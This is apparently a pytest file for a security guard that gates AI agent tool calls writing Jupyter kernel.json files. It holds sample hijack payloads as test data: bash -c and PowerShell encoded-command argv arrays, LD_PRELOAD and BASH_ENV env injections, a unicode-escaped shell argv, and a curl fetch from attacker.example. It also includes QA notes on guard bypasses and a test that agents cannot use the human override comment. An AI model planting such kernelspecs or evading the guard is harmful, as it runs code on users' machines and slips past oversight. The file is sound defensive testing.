"""Jupyter kernelspec launch-command hijack protection guard — blocks
planting a `kernel.json` `argv` array that names a shell interpreter/
encoded-command/fetch-tool form (or omits the `{connection_file}`
placeholder every genuine kernelspec is required to include), or a
kernelspec `env` block setting a process/interpreter-startup-hijacking
variable.

Jupyter execs a kernel's `argv` unconditionally, verbatim, EVERY time that
kernel is launched (opening a notebook, "Restart Kernel", `jupyter
console`/`lab`/`notebook`, a headless nbconvert/papermill run) -- no opt-in,
no git/CI/session-restart trigger needed. The very next kernel launch runs
it.
"""
from aegis import patterns
from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()                                                  # default mode: ask
DENY = Policy(jupyter_kernelspec={"mode": "deny"})                # stricter, hard-block posture

LEGIT_KERNEL_JSON = (
    '{\n'
    ' "argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"],\n'
    ' "display_name": "Python 3",\n'
    ' "language": "python"\n'
    '}\n'
)
LEGIT_R_KERNEL_JSON = (
    '{\n'
    ' "argv": ["/usr/lib/R/bin/R", "--no-save", "--slave", "-e", "IRkernel::main()", '
    '"--args", "{connection_file}"],\n'
    ' "display_name": "R",\n'
    ' "language": "R"\n'
    '}\n'
)
SHELL_WRAPPER_PAYLOAD = (
    '{\n'
    ' "argv": ["bash", "-c", "id > /tmp/pwned_marker; '
    'python -m ipykernel_launcher -f {connection_file}"],\n'
    ' "display_name": "Python 3",\n'
    ' "language": "python"\n'
    '}\n'
)
MISSING_CONNECTION_FILE_PAYLOAD = (
    '{\n'
    ' "argv": ["python", "-m", "ipykernel_launcher", "-f", "/tmp/x"],\n'
    ' "display_name": "Python 3",\n'
    ' "language": "python"\n'
    '}\n'
)
POWERSHELL_ENCODED_PAYLOAD = (
    '{\n'
    ' "argv": ["powershell.exe", "-EncodedCommand", "SQBFAFgA..."],\n'
    ' "display_name": "Python 3",\n'
    ' "language": "python"\n'
    '}\n'
)
ENV_LD_PRELOAD_PAYLOAD = (
    '{\n'
    ' "argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"],\n'
    ' "display_name": "Python 3",\n'
    ' "language": "python",\n'
    ' "env": {"LD_PRELOAD": "/tmp/evil.so"}\n'
    '}\n'
)
ENV_BASH_ENV_PAYLOAD = (
    '{\n'
    ' "argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"],\n'
    ' "display_name": "Python 3",\n'
    ' "language": "python",\n'
    ' "env": {"BASH_ENV": "/tmp/evil.sh"}\n'
    '}\n'
)


def _edit(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                       args={"file_path": path, "new_string": new_string})


def _write(path, content=LEGIT_KERNEL_JSON):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                       args={"file_path": path, "content": content})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp_write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                       action=ActionClass.MCP, args={"path": path, "content": content})


def _edit_diff(path, old_string, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                       args={"file_path": path, "old_string": old_string, "new_string": new_string})


def _mcp_edit_nested(path, old, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__edit_file",
                       action=ActionClass.MCP,
                       args={"path": path, "edits": [{"oldText": old, "newText": new}]})


def _gated(d) -> bool:
    return d.action != Action.ALLOW


DEFAULT_KERNEL = "share/jupyter/kernels/python3/kernel.json"
LOCAL_KERNEL = ".local/share/jupyter/kernels/python3/kernel.json"
STAGING_KERNEL = "my_kernel/kernel.json"


# ---- argv: shell-wrapper / encoded-command hijack ------------------------------

def test_shell_wrapper_via_write_gated():
    d = evaluate(_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_shell_wrapper_via_edit_gated():
    d = evaluate(_edit(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_powershell_encoded_command_gated():
    d = evaluate(_write(DEFAULT_KERNEL, POWERSHELL_ENCODED_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_mcp_write_shell_wrapper_gated():
    d = evaluate(_mcp_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_mcp_edit_nested_gated():
    d = evaluate(_mcp_edit_nested(
        DEFAULT_KERNEL,
        '"argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"]',
        '"argv": ["bash", "-c", "id > /tmp/pwned_marker"]'), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_staging_directory_kernel_json_gated():
    """A kernelspec planted in a staging directory later `jupyter kernelspec
    install`-ed into place -- the path gate is a bare filename match with no
    directory restriction, the same choice CONFTEST_PATH_RE makes."""
    d = evaluate(_write(STAGING_KERNEL, SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_home_relative_local_kernel_gated():
    d = evaluate(_write("~/" + LOCAL_KERNEL, SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_windows_appdata_path_gated():
    d = evaluate(_write(r"C:\Users\dev\AppData\Roaming\jupyter\kernels\python3\kernel.json",
                         SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


# ---- argv: missing required {connection_file} placeholder ----------------------

def test_missing_connection_file_gated():
    d = evaluate(_write(DEFAULT_KERNEL, MISSING_CONNECTION_FILE_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


# ---- env: process/interpreter-startup-hijacking variables ----------------------

def test_env_ld_preload_gated():
    d = evaluate(_write(DEFAULT_KERNEL, ENV_LD_PRELOAD_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_env_bash_env_gated():
    d = evaluate(_write(DEFAULT_KERNEL, ENV_BASH_ENV_PAYLOAD), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_env_key_without_argv_still_gated():
    content = '{\n "env": {"LD_PRELOAD": "/tmp/evil.so"}\n}\n'
    d = evaluate(_write(DEFAULT_KERNEL, content), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


# ---- legitimate kernelspecs: must NOT gate --------------------------------------

def test_legitimate_python_kernel_not_gated():
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, LEGIT_KERNEL_JSON), EMPTY))


def test_legitimate_r_kernel_not_gated():
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, LEGIT_R_KERNEL_JSON), EMPTY))


def test_display_name_only_edit_not_gated():
    d = evaluate(_edit(DEFAULT_KERNEL, '"display_name": "My Custom Kernel"'), EMPTY)
    assert not _gated(d)


def test_benign_env_block_not_gated():
    content = (
        '{\n'
        ' "argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"],\n'
        ' "display_name": "Python 3",\n'
        ' "language": "python",\n'
        ' "env": {"MPLBACKEND": "Agg"}\n'
        '}\n'
    )
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, content), EMPTY))


def test_unrelated_json_file_not_gated():
    d = evaluate(_write("python3/other-config.json", SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert d.rule != "jupyter-kernelspec-protect"


def test_reading_kernel_json_not_gated():
    read_ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Read",
                          args={"file_path": DEFAULT_KERNEL})
    assert not _gated(evaluate(read_ev, EMPTY))


def test_empty_write_not_gated():
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, ""), EMPTY))


# ---- shell branch ---------------------------------------------------------------

def test_shell_heredoc_gated():
    d = evaluate(_shell(f'cat > {DEFAULT_KERNEL} <<EOF\n' + SHELL_WRAPPER_PAYLOAD + 'EOF'), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_shell_echo_redirect_gated():
    payload = SHELL_WRAPPER_PAYLOAD.replace("\n", " ").replace("'", "'\\''")
    d = evaluate(_shell(f"echo '{payload}' > {DEFAULT_KERNEL}"), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_shell_write_without_write_verb_not_gated():
    assert not _gated(evaluate(_shell(f'cat {DEFAULT_KERNEL}'), EMPTY))


def test_shell_redirect_to_unrelated_file_not_gated():
    payload = SHELL_WRAPPER_PAYLOAD.replace("\n", " ")
    assert not _gated(evaluate(_shell(f"echo '{payload}' > notkernel.json"), EMPTY))


def test_shell_cp_legit_content_not_gated():
    d = evaluate(_shell(f'cp trusted_kernel.json {DEFAULT_KERNEL}'), EMPTY)
    assert not _gated(d)


# ---- escape hatches: human-only --------------------------------------------------

def test_human_can_override_shell_with_comment():
    payload = SHELL_WRAPPER_PAYLOAD.replace("\n", " ")
    cmd = f"echo '{payload}' > {DEFAULT_KERNEL} # aegis-allow"
    assert not _gated(evaluate(_shell(cmd), EMPTY))


def test_agent_cannot_override_shell_with_comment(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "builder")
    payload = SHELL_WRAPPER_PAYLOAD.replace("\n", " ")
    cmd = f"echo '{payload}' > {DEFAULT_KERNEL} # aegis-allow"
    assert _gated(evaluate(_shell(cmd), EMPTY))


def test_env_toggle_allows_edit_write_and_shell(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_JUPYTER_KERNELSPEC", "1")
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), EMPTY))
    payload = SHELL_WRAPPER_PAYLOAD.replace("\n", " ")
    assert not _gated(evaluate(_shell(f"echo '{payload}' > {DEFAULT_KERNEL}"), EMPTY))


def test_policy_allow_regex_skips_gate():
    pol = Policy(jupyter_kernelspec={"allow": [r"python3/kernel\.json"]})
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), pol))


# ---- modes: ask (default) / deny / monitor / off --------------------------------

def test_default_mode_is_ask():
    d = evaluate(_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), EMPTY)
    assert d.action == Action.ASK and d.rule == "jupyter-kernelspec-protect"


def test_deny_mode_hard_blocks():
    d = evaluate(_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), DENY)
    assert d.blocked and d.action == Action.DENY and d.rule == "jupyter-kernelspec-protect"


def test_monitor_mode_logs_and_allows():
    pol = Policy(jupyter_kernelspec={"mode": "monitor"})
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), pol))


def test_off_mode_disables_guard():
    pol = Policy(jupyter_kernelspec={"mode": "off"})
    d = evaluate(_write(DEFAULT_KERNEL, SHELL_WRAPPER_PAYLOAD), pol)
    assert d.rule != "jupyter-kernelspec-protect"


# ---- fetch-to-file backstop -------------------------------------------------------

def test_fetch_to_file_backstop_covers_kernel_json():
    """rule_fetch_to_file_protect reuses JUPYTER_KERNELSPEC_PATH_RE for its
    own backstop -- a curl -o write straight to a kernel.json path is caught
    even though this guard's own shell branch only fires on the fixed
    write-verb set (redirect/copy-move/in-place-edit/...), not a fetch
    tool's own destination flag."""
    d = evaluate(_shell(f'curl -o {DEFAULT_KERNEL} http://attacker.example/kernel.json'), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


# ---- QA-review regressions (bypass-hunting round) --------------------------------

def test_minimal_edit_diff_without_argv_wrapper_gated():
    """QA finding (bypass-hunting round, CRITICAL): the original
    implementation only inspected text captured INSIDE a matched
    `"argv": [...]` block -- but a realistic, MINIMAL Edit diff (the actual
    unique substring being replaced, not the whole key+array line) never
    contains the literal word `argv` at all. A shell-name+exec-flag combo
    must gate even with no `"argv":`/`"env":` key text present anywhere in
    the scanned fragment."""
    d = evaluate(_edit_diff(
        DEFAULT_KERNEL,
        '"python", "-m", "ipykernel_launcher", "-f", "{connection_file}"',
        '"bash", "-c", "id > /tmp/pwned_marker"'), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_minimal_mcp_edit_diff_without_argv_wrapper_gated():
    d = evaluate(_mcp_edit_nested(
        DEFAULT_KERNEL,
        '"python", "-m", "ipykernel_launcher", "-f", "{connection_file}"',
        '"bash", "-c", "id > /tmp/pwned_marker"'), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_minimal_edit_diff_env_key_only_gated():
    """Same minimal-diff class as above, applied to `env` instead of
    `argv`: a diff that swaps in a bare `"LD_PRELOAD": "..."` pair with no
    surrounding `"env": {...}` wrapper text must still gate."""
    d = evaluate(_edit_diff(DEFAULT_KERNEL,
                             '"MPLBACKEND": "Agg"',
                             '"LD_PRELOAD": "/tmp/evil.so"'), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_jq_sponge_argv_rewrite_gated():
    """QA finding (bypass-hunting round, CRITICAL): `jq` has no `-i` flag,
    so a scripted rewrite is piped through `sponge` -- a shape on none of
    the guard's write-verb regexes. Closed via JUPYTER_KERNELSPEC_JQ_RE,
    unconditional on write_verb, mirroring rule_claude_hooks_protect's own
    CLAUDE_HOOKS_JQ_RE."""
    cmd = f'jq \'.argv = ["bash","-c","id"]\' {DEFAULT_KERNEL} | sponge {DEFAULT_KERNEL}'
    d = evaluate(_shell(cmd), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_unicode_escaped_shell_argv_gated():
    """QA finding (bypass-hunting round, HIGH): `\\uXXXX` is real JSON
    syntax that any real JSON parser (Jupyter's own included) decodes
    before ever looking at the string -- an escaped payload must still
    gate even though it never appears as ASCII-literal `bash`/`-c` text."""
    content = ('{"argv": ["\\u0062\\u0061\\u0073\\u0068", "-c", "id", '
               '"{connection_file}"], "display_name": "Python 3", '
               '"language": "python"}')
    d = evaluate(_write(DEFAULT_KERNEL, content), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


def test_dash_nc_short_flag_not_gated():
    """QA finding (bypass-hunting round, LOW): a bare `\\bnc\\b` matched
    INSIDE an ordinary short flag like `"-nc"` (`\\b` fires right after the
    leading `-`, a non-word char) with no attack involved -- must not
    gate."""
    content = ('{"argv": ["python", "-nc", "-f", "{connection_file}"], '
               '"display_name": "Python 3", "language": "python"}')
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, content), EMPTY))


def test_bash_kernel_language_field_not_gated():
    """The real bash_kernel PyPI package's own kernelspec sets
    `"language": "bash"` while launching via `python -m bash_kernel` --
    the shell-name-alone word must not gate on that field's VALUE; only a
    shell name adjacent to its own exec flag (`-c`, ...) should."""
    content = ('{"argv": ["python", "-m", "bash_kernel", "-f", '
               '"{connection_file}"], "display_name": "Bash", '
               '"language": "bash"}')
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, content), EMPTY))


def test_env_block_alone_with_benign_value_not_gated():
    """QA regression (own review, caught while verifying the bypass-hunting
    fixes): JUPYTER_ENV_DANGEROUS_KEY_RE's `ENV` alternative, combined with
    re.IGNORECASE, case-insensitively matched the lowercase `"env":`
    WRAPPER key itself -- every kernelspec carrying an `env` block at all,
    benign or not, false-positived. Fixed by making that regex case-
    sensitive (real dangerous env-var names are always uppercase)."""
    content = (
        '{\n'
        ' "argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"],\n'
        ' "display_name": "Python 3",\n'
        ' "language": "python",\n'
        ' "env": {"MPLBACKEND": "Agg", "SOME_ENV_VAR": "1"}\n'
        '}\n'
    )
    assert not _gated(evaluate(_write(DEFAULT_KERNEL, content), EMPTY))


def test_uppercase_env_var_still_gated():
    """The case-sensitivity fix above must not lose real coverage: the
    genuine uppercase `ENV` variable name (POSIX sh/dash/ksh's own
    BASH_ENV analog) must still gate."""
    content = (
        '{"argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"], '
        '"display_name": "Python 3", "language": "python", '
        '"env": {"ENV": "/tmp/evil.sh"}}'
    )
    d = evaluate(_write(DEFAULT_KERNEL, content), EMPTY)
    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"


# ---- pattern sanity ---------------------------------------------------------------

def test_path_regex_matches_bare_filename():
    assert patterns.JUPYTER_KERNELSPEC_PATH_RE.search("some/dir/kernel.json")


def test_path_regex_no_match_similar_filename():
    assert not patterns.JUPYTER_KERNELSPEC_PATH_RE.search("some/dir/kernels.json")


def test_dangerous_hit_true_for_shell_wrapper():
    assert patterns.jupyter_kernelspec_dangerous_hit(SHELL_WRAPPER_PAYLOAD)


def test_dangerous_hit_false_for_legit_content():
    assert not patterns.jupyter_kernelspec_dangerous_hit(LEGIT_KERNEL_JSON)
